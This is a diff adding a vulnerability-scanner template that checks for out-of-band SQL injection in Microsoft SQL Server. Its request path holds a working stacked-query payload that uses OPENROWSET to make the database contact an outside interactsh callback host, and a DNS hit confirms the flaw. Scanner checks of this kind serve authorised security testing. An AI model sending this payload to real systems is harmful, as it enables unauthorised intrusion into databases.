@@ -1,0 +1,18 @@
+id: mssql-oob-openrowset-http
+
+info:
+  name: MSSQL OOB via OPENROWSET HTTP Request
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,mssql,http
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={Microsoft Access Text Driver (*.txt;)};DefaultDir=\\\\{{interactsh-url}}\\\\;', 'SELECT * FROM test')--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
